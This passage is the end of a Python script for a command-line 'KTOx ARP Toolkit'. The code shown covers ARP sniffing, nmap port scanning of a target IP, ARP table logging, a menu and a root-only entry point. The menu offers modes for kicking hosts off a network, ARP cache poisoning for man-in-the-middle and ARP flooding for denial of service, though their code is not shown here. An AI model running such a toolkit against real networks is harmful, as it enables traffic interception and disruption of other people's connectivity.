                    f"  [{C_DIM}]+ new[/{C_DIM}]  [{C_WHITE}]{ip}[/{C_WHITE}]  "
                    f"[{C_STEEL}]{mac}[/{C_STEEL}]  [{C_DIM}]{ts}[/{C_DIM}]"
                )
                log("ARP_NEW", ip=ip, mac=mac)

    try:
        sniff(prn=_sniff, filter="arp", store=0)
    except KeyboardInterrupt:
        section("ARP WATCH STOPPED")
        log("ARPWATCH_STOP", entries=len(known))

# ── MODULE: Network Scan ───────────────────────────────────────────────────────
def mode_scan_only():
    section("MODULE // NETWORK SCAN")
    do_scan()
    print_host_table()
    console.print(f"\n  [{C_STEEL}]{len(hosts_list)} host(s) discovered.[/{C_STEEL}]\n")

# ── MODULE: Target Recon ───────────────────────────────────────────────────────
def mode_target_recon():
    section("MODULE // TARGET RECON")
    ip = Prompt.ask(f"  [{C_BLOOD}]Enter target IP[/{C_BLOOD}]")

    with Progress(
        SpinnerColumn(spinner_name="dots", style=C_BLOOD),
        TextColumn(f"[{C_STEEL}]Fast port scan on {ip}...[/{C_STEEL}]"),
        transient=True,
    ) as prog:
        prog.add_task("scan")
        nm = nmap.PortScanner()
        nm.scan(hosts=ip, arguments="-F -T4")

    mac      = retrieve_mac(ip)
    vendor   = resolve_vendor(mac) if mac else "N/A"
    hostname = resolve_hostname(ip)
    log("RECON", ip=ip, mac=mac, vendor=vendor, hostname=hostname)

    console.print(Panel(
        f"  {tag('IP:',       C_BLOOD)}      [{C_WHITE}]{ip}[/{C_WHITE}]\n"
        f"  {tag('MAC:',      C_STEEL)}      [{C_ASH}]{mac or 'N/A'}[/{C_ASH}]\n"
        f"  {tag('Vendor:',   C_STEEL)}      [{C_ASH}]{vendor}[/{C_ASH}]\n"
        f"  {tag('Hostname:', C_STEEL)}      [{C_ASH}]{hostname}[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ HOST INFO[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    if ip in nm.all_hosts():
        table = Table(box=box.SIMPLE_HEAD, border_style=C_RUST, header_style=f"bold {C_BLOOD}")
        table.add_column("PORT",    style=C_EMBER, width=8)
        table.add_column("PROTO",   style=C_STEEL, width=8)
        table.add_column("STATE",   style=C_GOOD,  width=10)
        table.add_column("SERVICE", style=C_ASH,   width=20)
        for proto in nm[ip].all_protocols():
            for port in sorted(nm[ip][proto].keys()):
                info  = nm[ip][proto][port]
                state = info['state']
                s_col = C_GOOD if state == "open" else C_DIM
                table.add_row(str(port), proto, f"[{s_col}]{state}[/{s_col}]", info['name'])
        console.print(table)
    else:
        warn("No port data returned — host may be filtered.")

# ── MODULE: ARP Table Snapshot ─────────────────────────────────────────────────
def mode_arp_snapshot():
    section("MODULE // ARP TABLE SNAPSHOT")
    import subprocess
    try:
        result = subprocess.check_output(["arp", "-a"], text=True)
    except Exception as e:
        err(f"arp command failed: {e}")
        return

    lines = [l for l in result.strip().splitlines() if l]
    table = Table(box=box.SIMPLE_HEAD, border_style=C_RUST, header_style=f"bold {C_BLOOD}")
    table.add_column("HOST",  style=C_WHITE, width=32)
    table.add_column("IP",    style=C_EMBER, width=18)
    table.add_column("MAC",   style=C_STEEL, width=20)
    table.add_column("IFACE", style=C_DIM,   width=12)

    entries = []
    for line in lines:
        parts = line.split()
        try:
            host  = parts[0]
            ip    = parts[1].strip("()")
            mac   = parts[3] if len(parts) > 3 else "N/A"
            iface = parts[-1] if len(parts) > 5 else "N/A"
            table.add_row(host, ip, mac, iface)
            entries.append({"host": host, "ip": ip, "mac": mac, "iface": iface})
        except:
            pass

    console.print(table)
    log("ARP_SNAPSHOT", entries=entries, count=len(entries))
    ok(f"{len(entries)} ARP entries logged → {LOG_FILE}")

# ── Main Menu ──────────────────────────────────────────────────────────────────
MENU_ITEMS = [
    ("1", "Kick ONE off",              mode_kick_one),
    ("2", "Kick SOME off",             mode_kick_some),
    ("3", "Kick ALL off",              mode_kick_all),
    ("4", "ARP Cache Poisoner [MITM]", mode_mitm),
    ("5", "ARP Flood [DoS]",           mode_arp_flood),
    ("6", "Gratuitous ARP Broadcast",  mode_gratuitous_arp),
    ("7", "ARP Watch",                 mode_arp_watch),
    ("8", "Network Scan",              mode_scan_only),
    ("9", "Target Recon",              mode_target_recon),
    ("0", "ARP Table Snapshot",        mode_arp_snapshot),
    ("E", "Exit",                      shutdown),
]

def draw_menu():
    console.print()
    left  = MENU_ITEMS[:6]
    right = MENU_ITEMS[6:]
    for i in range(max(len(left), len(right))):
        l = f"  [{C_BLOOD}][{left[i][0]}][/{C_BLOOD}]  [{C_ASH}]{left[i][1]:<32}[/{C_ASH}]"  if i < len(left)  else " " * 42
        r = f"  [{C_BLOOD}][{right[i][0]}][/{C_BLOOD}]  [{C_ASH}]{right[i][1]}[/{C_ASH}]"     if i < len(right) else ""
        console.print(l + r)
    console.print()

def print_status_bar():
    logname = os.path.basename(LOG_FILE) if LOG_FILE else "none"
    console.print(Rule(style=C_RUST))
    console.print(
        f" [{C_RUST}]▐[/{C_RUST}]"
        f"[{C_STEEL}]{default_interface}[/{C_STEEL}]"
        f" [{C_DIM}]|[/{C_DIM}]"
        f"[{C_EMBER}]{default_gateway_ip}[/{C_EMBER}]"
        f" [{C_DIM}]|[/{C_DIM}]"
        f"[{C_GOOD}]{len(hosts_list)}h[/{C_GOOD}]"
        f" [{C_DIM}]|[/{C_DIM}]"
        f"[{C_DIM}]{logname}[/{C_DIM}]"
        f"[{C_RUST}]▌[/{C_RUST}]"
    )
    console.print(Rule(style=C_RUST))

# ── Entry Point ────────────────────────────────────────────────────────────────
def main():
    global default_interface, default_iface_mac, default_gateway_ip

    if os.geteuid() != 0:
        err("Must be run as root — try: sudo python3 ktox.py")
        sys.exit(1)

    init_logger()
    draw_banner()

    try:
        console.print(f"  [{C_STEEL}]Detecting interface...[/{C_STEEL}]")
        default_interface  = get_default_interface()
        console.print(f"  [{C_GOOD}]✔ Interface:  {default_interface}[/{C_GOOD}]")

        console.print(f"  [{C_STEEL}]Detecting gateway...[/{C_STEEL}]")
        default_gateway_ip = get_gateway_ip()
        console.print(f"  [{C_GOOD}]✔ Gateway:    {default_gateway_ip}[/{C_GOOD}]")

        console.print(f"  [{C_STEEL}]Reading interface MAC...[/{C_STEEL}]")
        default_iface_mac  = get_iface_mac(default_interface)
        console.print(f"  [{C_GOOD}]✔ MAC:        {default_iface_mac}[/{C_GOOD}]")

        console.print(f"  [{C_STEEL}]Scanning network...[/{C_STEEL}]")
        do_scan()
    except KeyboardInterrupt:
        shutdown()
    except Exception as ex:
        err(f"Init failed: {ex}")
        import traceback; traceback.print_exc()
        sys.exit(1)

    log("INIT_COMPLETE",
        interface=default_interface,
        iface_mac=default_iface_mac,
        gateway=default_gateway_ip,
        hosts=len(hosts_list))

    print_status_bar()

    while True:
        try:
            draw_menu()
            choice = Prompt.ask(f"  [{C_BLOOD}]ktox[/{C_BLOOD}]").strip().upper()
        except KeyboardInterrupt:
            shutdown()
        except EOFError:
            shutdown()

        matched = False
        for key, _, fn in MENU_ITEMS:
            if choice == key.upper():
                try:
                    fn()
                except KeyboardInterrupt:
                    warn("Interrupted — returning to menu.")
                except Exception as ex:
                    err(f"Error: {ex}")
                    log("ERROR", detail=str(ex))
                    import traceback; traceback.print_exc()
                matched = True
                break
        if not matched:
            err("Invalid option.")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="KTOx ARP Toolkit")
    parser.add_argument("--gui", action="store_true", help="Launch CustomTkinter GUI")
    parser.add_argument("--cli", action="store_true", help="Launch CLI (default)")
    args = parser.parse_args()

    if args.gui:
        try:
            import ktox_gui
            ktox_gui.launch()
        except ImportError:
            print("ERROR: ktox_gui.py not found or customtkinter not installed.")
            print("Run: pip3 install customtkinter")
            sys.exit(1)
    else:
        main()
